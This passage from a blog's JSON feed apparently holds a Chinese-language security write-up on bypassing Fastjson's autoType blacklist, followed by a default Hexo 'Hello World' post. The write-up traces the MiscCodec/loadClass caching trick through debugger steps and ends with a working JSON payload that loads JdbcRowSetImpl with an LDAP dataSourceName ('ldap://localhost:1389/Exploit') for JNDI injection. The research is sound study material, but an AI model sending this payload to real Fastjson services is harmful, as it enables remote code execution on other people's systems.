data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240619152628310.png\" class title=\"image-20240619152628310\"></p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240619152641886.png\" class title=\"image-20240619152641886\"></p>\n<p>若是从 <code>mappings</code>  中取到了 class 或者从 <code>deserializers</code>  中取到 class，则会返回</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240619152916848.png\" class title=\"image-20240619152916848\"></p>\n<p>然后再往下就是没有开启 <code>autoTypeSupport</code>  时的处理，此时就直接匹配黑名单，匹配到直接抛出异常</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240619153003713.png\" class title=\"image-20240619153003713\"></p>\n<p>所以在这里出现了可以利用的点：先将要反序列化的类先加入到 <code>mappings</code>  中，然后再调用到 <code>checkAutoType()</code>  方法即可绕过黑白名单</p>\n<p>所以寻找能够往 <code>mappings</code>  中赋值的方法，首先发现了 <code>addBaseClassMappings()</code>  方法，然而该方法无参数传入，无法利用；然后找到了 <code>loadClass()</code>  方法</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240619153925994.png\" class title=\"image-20240619153925994\"></p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240619154133753.png\" class title=\"image-20240619154133753\"></p>\n<p>该方法可以尝试利用，只要参数可控即可利用成功，寻找一下调用该方法的地方</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240619172759472.png\" class title=\"image-20240619172759472\"></p>\n<p>在 <code>com.alibaba.fastjson.serializer.MiscCodec.java</code>  文件中的 <code>deserialze()</code>  中发现了调用，调用的条件为传入的 <code>clazz</code>  为 <code>Class.class</code></p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240619173242478.png\" class title=\"image-20240619173242478\"></p>\n<p>该类实现了序列化与反序列化的接口，因此可以通过该类的实例来进行反序列化的操作</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240619204544677.png\" class title=\"image-20240619204544677\"></p>\n<p>此时可以进行简单调试下看看流程，发现在初始化反序列化器的时候也将 <code>MiscCodec</code>  的实例添加了进去，测试数据为：</p>\n<figure class=\"highlight json\"><figcaption data-lang=\"JSON\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"java.lang.Class\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token property\">\"val\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"666\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240619212224359.png\" class title=\"image-20240619212224359\"></p>\n<p>继续调试发现在获取反序列化器时获取的正是 <code>MiscCodec</code></p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240619214008137.png\" class title=\"image-20240619214008137\"></p>\n<p>继续向下调试，设置解析状态为 <code>TypeNameRedirect</code></p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240619220403694.png\" class title=\"image-20240619220403694\"></p>\n<p>接下来就使用 <code>MiscCodec</code>  的反序列化器来执行反序列化操作了</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240619220525207.png\" class title=\"image-20240619220525207\"></p>\n<p>继续跟进 <code>deserialize()</code>  方法里面，该部分实现的功能就是解析 JSON 中的 <code>&quot;val&quot;</code>  字段，并将对应的值赋值给 <code>objVal</code>  变量</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240619220857162.png\" class title=\"image-20240619220857162\"></p>\n<p>接着将 <code>objVal</code>  的值传给了 <code>strVal</code></p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240619221007895.png\" class title=\"image-20240619221007895\"></p>\n<p>然后便执行到了预期的 <code>loadClass()</code>  处</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240619221158026.png\" class title=\"image-20240619221158026\"></p>\n<p>继续往里跟进，最后运行到此处，当 <code>className</code>  存在时则会返回对应的 Class 对象，然后就把类名与 Class 对象添加进 <code>mappings</code>  里面</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240619221550165.png\" class title=\"image-20240619221550165\"></p>\n<p>到此利用链就清晰了，现在可以构造黑名单中的类作为 <code>strVal</code>  的值，然后就会被加载进 <code>mappings</code>  中，接着再通过 <code>@type</code>  请求即可成功绕过黑名单，所以最终的 payload 为：</p>\n<figure class=\"highlight json\"><figcaption data-lang=\"JSON\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token property\">\"h40vv3n\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"java.lang.Class\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token property\">\"val\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"com.sun.rowset.JdbcRowSetImpl\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token property\">\"h40vv3n1\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"com.sun.rowset.JdbcRowSetImpl\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token property\">\"dataSourceName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ldap://localhost:1389/Exploit\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token property\">\"autoCommit\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>使用 postman 打过去成功触发恶意代码</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240619222828702.png\" class title=\"image-20240619222828702\"></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2024/06/24/hello-world/",
            "url": "http://example.com/2024/06/24/hello-world/",
            "title": "Hello World",
            "date_published": "2024-06-24T12:26:44.904Z",
            "content_html": "<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"quick-start\"><a class=\"anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo new <span class=\"token string\">\"My New Post\"</span></pre></td></tr></table></figure><p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"run-server\"><a class=\"anchor\" href=\"#run-server\">#</a> Run server</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo server</pre></td></tr></table></figure><p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"generate-static-files\"><a class=\"anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo generate</pre></td></tr></table></figure><p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo deploy</pre></td></tr></table></figure><p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n",
            "tags": []
        }
    ]
}